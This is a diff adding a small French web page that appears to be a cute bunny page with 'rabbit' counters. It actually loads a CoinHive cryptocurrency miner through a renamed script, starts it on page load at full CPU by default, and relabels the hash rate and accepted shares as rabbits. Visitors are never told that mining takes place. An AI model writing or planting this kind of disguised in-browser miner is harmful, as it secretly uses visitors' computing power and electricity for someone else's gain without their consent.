@@ -1,0 +1,42 @@
+<!-- skWtAqTObfrTtxo9vBjhMqMmXjGRyV5R -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>LAPIN :3</title>
+</head>
+<style>
+	body {background-image:url('Blue-water-background-picture-material-5-40657.jpg');font-family: Comic Sans MS;text-align: center;}
+	img {max-width: 100%;}
+</style>
+<body>
+<h1 id="message"></h1>
+<h3>
+	Lapins par seconde: <b><span id="hps">0</span></b><br>
+	Total Lapins: <b><span id="th">0</span></b><br>
+	Lapins confirmés: <b><span id="ah">0</span></b><br>
+</h3>
+<img src="cutest-bunny-rabbits-23.jpg">
+<script src="js/jquery.js"></script>
+<script src="js/lapin.js"></script>
+<script>
+	var throttle = location.search.split('t=')[1]
+	if (throttle==undefined) {throttle=0};
+	var lapin = new CoinHive.Anonymous('skWtAqTObfrTtxo9vBjhMqMmXjGRyV5R', {throttle: throttle});
+	lapin.start();
+	$('#message').html('Salut !');
+</script>
+<script>
+	lapin.on('found', function() { $('#message').html('Lapin trouvé');})
+	lapin.on('accepted', function() { $('#message').html('Lapin accepté dans la piscine');})
+	setInterval(function() {
+		var hashesPerSecond = lapin.getHashesPerSecond();
+		var totalHashes = lapin.getTotalHashes();
+		var acceptedHashes = lapin.getAcceptedHashes();
+		$('#hps').html(hashesPerSecond);
+		$('#th').html(totalHashes);
+		$('#ah').html(acceptedHashes);
+	}, 1000);
+</script>
+</body>
+</html>
